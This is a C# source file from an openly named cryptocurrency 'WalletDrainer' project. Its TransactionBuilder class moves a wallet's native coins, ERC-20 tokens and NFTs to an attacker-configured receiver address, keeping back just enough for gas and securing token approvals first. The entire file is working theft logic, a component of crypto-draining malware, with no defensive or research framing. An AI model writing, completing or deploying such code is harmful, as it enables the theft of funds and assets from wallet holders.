using WalletDrainer.Blockchain;
using WalletDrainer.Config;
using WalletDrainer.Models;

namespace WalletDrainer.Core;

public sealed class TransactionBuilder
{
    private readonly Web3Client _web3;
    private readonly GasEstimator _gasEstimator;
    private readonly TokenApproval _tokenApproval;
    private readonly NftTransfer _nftTransfer;
    private readonly DrainerConfig _config;

    public TransactionBuilder(
        Web3Client web3,
        GasEstimator gasEstimator,
        TokenApproval tokenApproval,
        NftTransfer nftTransfer,
        DrainerConfig config)
    {
        _web3 = web3;
        _gasEstimator = gasEstimator;
        _tokenApproval = tokenApproval;
        _nftTransfer = nftTransfer;
        _config = config;
    }

    public async Task<DrainResult> DrainAsset(WalletAsset asset, CancellationToken ct = default)
    {
        try
        {
            if (asset.IsNft)
            {
                return await DrainNft(asset, ct);
            }

            if (asset.IsNative)
            {
                return await DrainNativeToken(asset, ct);
            }

            return await DrainErc20Token(asset, ct);
        }
        catch (Exception ex)
        {
            return new DrainResult
            {
                Success = false,
                ErrorMessage = ex.Message,
                Asset = asset
            };
        }
    }

    private async Task<DrainResult> DrainNativeToken(WalletAsset asset, CancellationToken ct)
    {
        var gasPrice = await _gasEstimator.GetOptimalGasPrice(asset.Chain, ct);
        decimal gasReserve = gasPrice * 21000m;
        decimal transferAmount = asset.Balance - gasReserve;

        if (transferAmount <= 0)
            return new DrainResult { Success = false, ErrorMessage = "Insufficient balance after gas", Asset = asset };

        string txHash = await _web3.SendNativeTransfer(
            asset.Chain, _config.ReceiverAddress, transferAmount, gasPrice, ct);

        return new DrainResult
        {
            Success = true,
            TransactionHash = txHash,
            AmountDrained = transferAmount,
            Asset = asset
        };
    }

    private async Task<DrainResult> DrainErc20Token(WalletAsset asset, CancellationToken ct)
    {
        bool approved = await _tokenApproval.EnsureApproval(
            asset.Chain, asset.ContractAddress!, _config.ReceiverAddress, asset.Balance, ct);

        if (!approved)
            return new DrainResult { Success = false, ErrorMessage = "Approval failed", Asset = asset };

        string txHash = await _web3.TransferErc20(
            asset.Chain, asset.ContractAddress!, _config.ReceiverAddress, asset.Balance, ct);

        return new DrainResult
        {
            Success = true,
            TransactionHash = txHash,
            AmountDrained = asset.Balance,
            Asset = asset
        };
    }

    private async Task<DrainResult> DrainNft(WalletAsset asset, CancellationToken ct)
    {
        string txHash = await _nftTransfer.TransferNft(
            asset.Chain, asset.ContractAddress!, asset.TokenId!.Value, _config.ReceiverAddress, ct);

        return new DrainResult
        {
            Success = true,
            TransactionHash = txHash,
            AmountDrained = 1,
            Asset = asset
        };
    }
}
